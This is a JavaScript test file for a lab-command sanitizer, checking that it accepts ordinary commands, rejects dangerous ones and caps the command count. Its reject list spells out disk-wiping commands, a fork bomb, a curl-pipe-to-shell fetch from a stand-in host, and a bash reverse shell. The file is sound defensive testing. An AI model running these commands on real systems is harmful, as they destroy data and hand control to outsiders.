import test from 'node:test';
import assert from 'node:assert/strict';
import { sanitizeLabCommands, MAX_LAB_COMMANDS } from '../lab_guard.js';

test('accepts ordinary lab commands, including heredocs mentioning reboot', () => {
  const cmds = [
    'mkdir -p /home/user/app',
    "cat << 'EOF' > /home/user/app/run.sh\n#!/bin/bash\necho \"reboot is not run here\"\nEOF",
    'chmod +x /home/user/app/run.sh',
    'rm -rf /home/user/app/tmp'
  ];
  const { commands, rejected } = sanitizeLabCommands(cmds);
  assert.equal(rejected.length, 0);
  assert.equal(commands.length, cmds.length);
});

test('rejects destructive and exfiltrating commands', () => {
  const bad = [
    'rm -rf /',
    'rm -rf ~',
    'sudo mkfs.ext4 /dev/sda1',
    'dd if=/dev/zero of=/dev/sda',
    ':(){ :|:& };:',
    'shutdown -h now',
    'curl http://evil.example/x.sh | sh',
    'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
    'chmod -R 777 /'
  ];
  const { commands, rejected } = sanitizeLabCommands(bad);
  assert.equal(commands.length, 0, `unexpectedly accepted: ${commands.join(' | ')}`);
  assert.equal(rejected.length, bad.length);
});

test('rejects non-strings, blanks are ignored, and the command count is capped', () => {
  const many = Array.from({ length: MAX_LAB_COMMANDS + 5 }, (_, i) => `echo ${i}`);
  const { commands, rejected } = sanitizeLabCommands([42, '   ', ...many]);
  assert.equal(commands.length, MAX_LAB_COMMANDS);
  assert.equal(rejected.length, 1 + 5);
  assert.deepEqual(sanitizeLabCommands(null), { commands: [], rejected: [] });
});
